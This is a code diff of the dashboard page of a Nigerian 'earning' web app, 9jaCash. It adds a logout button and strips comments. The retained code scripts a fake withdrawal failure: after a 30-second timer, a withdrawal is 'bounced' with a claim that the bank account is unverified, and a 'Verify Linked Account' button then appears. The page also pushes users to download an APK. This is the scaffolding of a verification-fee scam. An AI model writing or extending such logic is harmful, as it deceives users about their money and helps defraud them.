@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -28,6 +27,8 @@ body.dark-mode .nav-item.active{color:#818cf8;}
 body.dark-mode .nav-mid{border-color:#0f172a;}
 body.dark-mode .eye-btn,body.dark-mode .bank-edit{background:#334155;color:#94a3b8;}
 body.dark-mode .notify-btn{background:#1e293b;border-color:#334155;color:#94a3b8;}
+body.dark-mode .logout-btn-head{background:#fef2f2;border-color:#fecaca;color:#ef4444;}
+body.dark-mode .logout-btn-head:hover{background:#fee2e2;color:#dc2626;}
 body.dark-mode .checkin-day.active{border-color:#818cf8;}
 body.dark-mode .checkin-day.locked{opacity:0.3;}
 body.dark-mode .cta-btn:disabled{background:#334155;color:#64748b;}
@@ -50,6 +51,8 @@ body.dark-mode .telegram-float{background:linear-gradient(135deg,#0088cc,#00a8e8
 .name{font-size:16px;font-weight:700;color:#1e293b;transition:color 0.3s;}
 .notify-btn{width:44px;height:44px;border-radius:14px;background:#fff;border:1px solid #e2e8f0;display:flex;align-items:center;justify-content:center;color:#64748b;font-size:16px;cursor:pointer;transition:all 0.3s;box-shadow:0 2px 8px rgba(0,0,0,0.04);}
 .notify-btn:hover{background:#f1f5f9;color:#6366f1;}
+.logout-btn-head{color:#ef4444;background:#fef2f2;border-color:#fecaca;}
+.logout-btn-head:hover{background:#fee2e2;color:#dc2626;}
 .tour-pill{display:flex;align-items:center;gap:8px;padding:8px 16px;border-radius:50px;background:#fff;border:1px solid #e2e8f0;font-size:12px;font-weight:700;color:#6366f1;cursor:pointer;transition:all 0.3s;box-shadow:0 2px 8px rgba(0,0,0,0.04);margin-bottom:16px;}
 .tour-pill:hover{background:#eef2ff;transform:translateY(-1px);}
 .tour-pill i{font-size:14px;}
@@ -79,7 +82,6 @@ body.dark-mode .telegram-float{background:linear-gradient(135deg,#0088cc,#00a8e8
 .bank-meta{font-size:12px;color:#94a3b8;transition:color 0.3s;}
 .bank-edit{width:36px;height:36px;border-radius:10px;background:#f8fafc;display:flex;align-items:center;justify-content:center;color:#94a3b8;font-size:12px;cursor:pointer;border:none;transition:all 0.2s;}
 .bank-edit:hover{background:#e2e8f0;color:#6366f1;}
-/* VERIFY BUTTON — ONLY shows after bounce has been reversed and money returned */
 .verify-btn-wrap{display:none;margin-top:12px;}
 .verify-btn-wrap.show{display:block !important;animation:slideUp 0.5s ease both;}
 .verify-btn{width:100%;padding:16px;border-radius:16px;background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;font-size:15px;font-weight:800;border:none;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 4px 20px rgba(239,68,68,0.3);animation:slideUp 0.5s ease both;}
@@ -283,9 +285,9 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
     </div>
   </div>
   <div style="display: flex; gap: 8px; align-items: center;">
-    <!-- Download App Button added to header -->
     <button class="notify-btn" onclick="showDownloadPrompt()" id="downloadHeaderBtn" title="Download App"><i class="fa-solid fa-download"></i></button>
     <button class="notify-btn" onclick="showToast('No new notifications')" id="notifyBtn"><i class="fa-regular fa-bell"></i></button>
+    <button class="notify-btn logout-btn-head" onclick="logout()" id="logoutBtn" title="Logout"><i class="fa-solid fa-right-from-bracket"></i></button>
   </div>
 </div>
 <button class="tour-pill anim d1" id="startTourBtn" onclick="startTutorial()">
@@ -318,7 +320,6 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
   </div>
   <button class="bank-edit" onclick="editBank()"><i class="fa-solid fa-pen"></i></button>
 </div>
-<!-- VERIFY BUTTON: ONLY shows after withdrawal has been bounced back and money returned -->
 <div class="verify-btn-wrap" id="verifyBankWrap">
   <button class="verify-btn" onclick="verifyBankLink()" id="verifyBankBtn">
     <i class="fa-solid fa-shield-halved"></i><span>Verify Linked Account</span>
@@ -391,7 +392,7 @@ body.dark-mode .redirect-overlay{background:linear-gradient(135deg,#0f172a 0%,#1
 <script>
 let userData = null;
 try { userData = JSON.parse(localStorage.getItem("9jaCashUser")); } catch(e) { userData = null; }
-if (!userData) { window.location.href = "start.html"; }
+if (!userData) { window.location.href = "login.html"; }
 
 let balance = parseFloat(localStorage.getItem("walletBalance")) || 0;
 let balanceHidden = false;
@@ -433,6 +434,29 @@ function initFirebase() {
     }
   } catch(e) { console.error("Firebase init error:", e); }
   return false;
+}
+
+function logout() {
+  Swal.fire({
+    title: "Logout?",
+    text: "Are you sure you want to log out of your account?",
+    icon: "warning",
+    showCancelButton: true,
+    confirmButtonText: "Yes, Logout",
+    cancelButtonText: "Cancel",
+    confirmButtonColor: "#ef4444",
+    background: document.body.classList.contains("dark-mode") ? "#1e293b" : "#fff",
+    color: document.body.classList.contains("dark-mode") ? "#f8fafc" : "#1e293b"
+  }).then(function(result) {
+    if (result.isConfirmed) {
+      if (auth) {
+        auth.signOut().catch(function(err) { console.error("Firebase logout error:", err); });
+      }
+      localStorage.removeItem("9jaCashUser");
+      localStorage.removeItem("walletBalance");
+      window.location.href = "login.html";
+    }
+  });
 }
 
 function loadTelegramConfig() {
@@ -550,10 +574,6 @@ function finishTutorial() {
   showToast("Tour complete! Start earning!");
 }
 
-// ========== CRITICAL FIX: VERIFY BUTTON ONLY SHOWS AFTER BOUNCE IS COMPLETE ==========
-// ONLY check 9jaCashBouncedWithdrawal — set AFTER executeBounce() returns money
-// Removed pendingBounce check because that means bounce hasn't happened yet
-
 function checkAndShowVerifyButton() {
   const hasBouncedBefore = localStorage.getItem("9jaCashBouncedWithdrawal") === "true";
   const wrap = document.getElementById("verifyBankWrap");
@@ -567,7 +587,6 @@ function checkAndShowVerifyButton() {
   }
 }
 
-// ========== executeBounce — runs when timer expires, returns money, shows popup + button ==========
 function executeBounce() {
   const stored = localStorage.getItem("pendingBounce");
   if (!stored) return;
@@ -576,7 +595,6 @@ function executeBounce() {
     const amount = parseFloat(data.amount) || 0;
     if (amount <= 0) { localStorage.removeItem("pendingBounce"); return; }
     
-    // Return money to balance
     const currentBalance = parseFloat(localStorage.getItem("walletBalance")) || 0;
     balance = currentBalance + amount;
     userData.balance = balance;
@@ -592,11 +610,9 @@ function executeBounce() {
     addBounceToActivity("Withdrawal Reversed", amount, "Unsuccessful - Linked bank account not verified");
     sendBounceNotification(amount);
     
-    // Set flag AFTER money is returned — this triggers the verify button
     localStorage.setItem("9jaCashBouncedWithdrawal", "true");
     checkAndShowVerifyButton();
     
-    // Show bounce popup
     Swal.fire({
       icon: "warning",
       title: "Withdrawal Failed",
@@ -615,7 +631,6 @@ function executeBounce() {
   }
 }
 
-// ========== Check if pending bounce is ready to execute on page load ==========
 function checkPendingBounceOnLoad() {
   const stored = localStorage.getItem("pendingBounce");
   if (!stored) return;
@@ -624,7 +639,7 @@ function checkPendingBounceOnLoad() {
     const timestamp = data.timestamp || 0;
     const now = Date.now();
     const elapsed = now - timestamp;
-    const BOUNCE_DELAY = 30000; // 30 seconds
+    const BOUNCE_DELAY = 30000;
     
     if (elapsed >= BOUNCE_DELAY) {
       console.log("Bounce timer expired while away - executing now");
@@ -911,7 +926,6 @@ window.addEventListener("DOMContentLoaded", function() {
   document.getElementById("bankNameText").textContent = userData.bankName || "No bank linked";
   document.getElementById("bankMeta").textContent = maskNum(userData.accountNumber) + " | " + (userData.fullName || userData.name || "Unknown");
   
-  // Check if bounce is ready and show verify button ONLY after bounce completes
   checkPendingBounceOnLoad();
   checkAndShowVerifyButton();
   
@@ -964,7 +978,6 @@ function dismissDownloadPrompt() {
 function downloadAppAPK() {
   dismissDownloadPrompt();
   showToast("Starting APK download...");
-  // Link to your hosted GitHub or storage APK binary file
   const apkUrl = "https://raw.githubusercontent.com/Xantech007/9jaCashMine/main/9jaCash.apk";
   window.location.href = apkUrl;
 } 
